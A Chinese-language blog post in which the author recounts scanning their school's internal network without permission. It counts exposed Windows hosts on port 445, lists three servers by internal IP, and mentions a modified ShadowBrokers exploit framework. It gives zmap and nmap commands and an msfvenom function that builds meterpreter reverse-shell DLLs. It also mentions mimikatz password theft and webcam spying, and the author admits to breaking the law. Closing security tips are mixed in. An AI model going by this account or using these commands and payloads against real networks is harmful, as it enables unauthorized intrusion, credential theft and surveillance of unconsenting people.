---
layout : post
targs : code
premalink : pretty
---

今天测试了一下学校的内网主机，傻逼学校没做VLAN，光在 `10.170.0.0/16` 就扫到了 *1662* 台开着 *445* 端口的主机:

```bash
➜  ./fmt.sh | wc -l                   
1662
➜  ./fmt.sh | grep "Windows 7" | wc -l
451
➜  ./fmt.sh | grep "Windows 8" | wc -l
378
➜  ./fmt.sh | grep "Windows 10" | wc -l
788
➜  ./fmt.sh | grep "Windows XP" | wc -l
40
➜  ./fmt.sh | grep "Windows 2008" | wc -l
3
➜  ./fmt.sh | grep "Windows 2008"        
[*] 10.170.6.47       - Windows 2008 R2 Standard SP1  (name:WIN-4K4BK0ASC6S) 
[*] 10.170.21.57      - Windows 2008 R2 Enterprise SP1  (name:WIN-5QRE8RSJDPG) 
[*] 10.170.23.233     - Windows 2008 R2 Enterprise SP1  (name:WIN-KN28SU23S2F)
➜ 
```

其中还有几台2008服务器，唉，啥都不说了。

大体扫描了一下，Win7的装机率还是挺高的，有`27%`，关键，任何一台Win7都有80%以上的概率会被直接搞掉，也就是说，这1600多台主机中，有 `450*0.8=360` 台机器可以拿来当肉鸡，什么360,电脑管家，鸟用没有。

而且还有40台XP？？？我真是醉的不行。

这个扫描是在下午进行的，那时候上课的人还不少，我在吃完晚饭回来的时候又扫了一下，得到了：

```bash
➜  grep "Up" nmap_out_2 | wc -l
2732
➜  grep "Windows 7" nmap_out_2 | wc -l
682
```

将近700台开着445端口的Win7,乘以个0.8, 就是560台肉鸡。

总体看来，有25%以上的同学还在使用Win7，并且没有开防火墙，没有关闭445端口。可怕。

很多时候就是打开防火墙的一个问题，在这里推荐一个Windows下的流量管理工具 *[GlassWire](https://www.glasswire.com/)*，有简单的防火墙功能，而且，很漂亮。

我还把shadowbroker的fb框架改了改，可以直接跑script脚本了：<https://github.com/wrfly/shadowbroker-auto>

然后用到的一些扫描命令，在这里记一下：

```bash
#zmap
docker run --privileged --rm -ti -v `pwd`:/tmp dominik/zmap -p 445 10.170.0.0/16 -o /tmp/result

#nmap
nmap --script smb-os-discovery.nse -p445 -iL result 
sudo nmap -O --osscan-guess -Pn -T4 -p 445 -iL result -n -oG out

#msg窗口
msg.exe * "Your System is Vulnerable. Upgrade Your System to Windows 8+, or Turn On Your Fire Wall."
```

一个小的function:
```bash
generate_msfvenom () {
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=8888 -f dll > go.dll
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=8888 -f dll > go_64.dll
}
```

然后刚知道，meterpreter有一个自带的mimikatz，可以直接load，然后拿密码的。

meterpreter的摄像头监控，是一直拍照片，然后有个网页加载这个照片。。。

摄像头被非法打开的时候，灯是会亮的，这个时候你就要考虑拔网线了。百度是没用的。

忘记那个杀毒软件了，有个防止非法开启摄像头的功能，很赞。

其实路由器也能当防火墙用，因为路由器不会开那么多端口。

Windows的系统更新很重要。

嗯，我违法了。

![oOo](../img/s/fb/sb-fb-screenshots.png)


一点小建议：

- 打开Windows的防火墙，并开启系统更新
- 摄像头的灯如果莫名亮了，那就要拔网线
- 虽然隐私已经不存在了，但还是要多关注一下安全
- 学校漏洞很多，应该找专人负责，并，给予报酬
- 别用XP了，真的
- 程序员更应该关注安全，别一天到晚写代码，自己电脑被日了都不知道

就这些吧。

---

刚才又扫了一批（上午十一点左右）：
```bash
Nmap done: 1969 IP addresses (1969 hosts up) scanned in 1790.78 seconds
➜  4-19 grep "Windows 7" nmap_scan | wc -l
573
```

*30%*的 Windows 7


